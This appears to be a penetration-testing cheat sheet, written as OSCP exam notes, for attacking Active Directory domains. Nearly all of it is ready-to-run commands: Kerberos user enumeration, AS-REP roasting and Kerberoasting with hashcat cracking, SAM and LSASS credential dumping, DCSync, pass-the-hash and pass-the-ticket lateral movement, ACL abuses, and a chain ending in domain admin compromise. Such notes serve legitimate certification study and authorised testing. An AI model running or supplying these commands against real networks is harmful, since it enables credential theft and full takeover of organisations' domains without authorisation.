# Active Directory Attacks

The OSCP AD set is 3 chained boxes. Typical flow: foothold on user workstation → enumerate domain → lateral move → DC compromise.

## Initial enumeration (no creds)

```bash
# port scan DC
nmap -sC -sV -p- $DC

# user enum via Kerberos
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

# SMB null
enum4linux-ng -A $DC
smbmap -H $DC -u "" -p ""

# LDAP anonymous
ldapsearch -x -H ldap://$DC -s base
```

## With creds — full enumeration

### BloodHound
```bash
# Python collector (from Kali)
bloodhound-python -u user -p pass -d domain.local -ns $DC -c All --zip

# import to BloodHound GUI
neo4j console &
bloodhound
```

Mark owned, run pre-built queries:
- Shortest path to Domain Admins
- Kerberoastable users
- AS-REP roastable users
- DCSync rights

### Manual LDAP queries
```bash
# users
impacket-GetADUsers -all domain.local/user:pass -dc-ip $DC

# computers
ldapsearch -x -H ldap://$DC -D "user@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=computer)"
```

## Kerberos attacks

### AS-REP roast (users without preauth)
```bash
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $DC
# crack with hashcat mode 18200
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoast (request service tickets, crack offline)
```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC -request
# crack with hashcat mode 13100
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Credential dumping

### From SAM (local admin)
```bash
# remote (need local admin)
impacket-secretsdump user:pass@$IP

# from registry on victim
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# then offline:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### LSASS dump
```cmd
# get PID
tasklist /svc | findstr lsass.exe
# dump (need SeDebug)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
# parse offline
pypykatz lsa minidump lsass.dmp
```

### DCSync (need replication rights)
```bash
impacket-secretsdump -just-dc domain.local/user:pass@$DC
```

## Lateral movement

### Pass-the-Hash
```bash
# psexec
impacket-psexec -hashes :NTHASH user@$IP
# wmiexec (stealthier, no service)
impacket-wmiexec -hashes :NTHASH user@$IP
# smbexec
impacket-smbexec -hashes :NTHASH user@$IP

# evil-winrm (when WinRM 5985 open)
evil-winrm -i $IP -u user -H NTHASH
```

### Pass-the-Ticket
```bash
# get TGT
impacket-getTGT domain.local/user:pass
export KRB5CCNAME=user.ccache
# use with -k -no-pass
impacket-psexec -k -no-pass user@host.domain.local
```

### Overpass-the-Hash (NTLM → TGT)
```bash
impacket-getTGT domain.local/user -hashes :NTHASH
```

## ACL abuses (BloodHound finds these)

- **GenericAll** on user → reset password / add SPN for kerberoast
- **GenericAll** on group → add yourself to group
- **WriteDACL** → grant yourself rights, then exploit
- **ForceChangePassword** → reset target user password
- **AddMember** → add yourself to privileged group

## Common chain

1. Foothold user (SMB share creds / web exploit / etc.)
2. BloodHound from that user
3. Find kerberoastable → crack → escalate
4. Or find ACL path → exploit → escalate
5. Local admin somewhere → secretsdump → get more hashes
6. Find DA hash or DCSync rights → secretsdump full domain
7. Golden ticket if you want persistence (not needed for exam, but learn it)
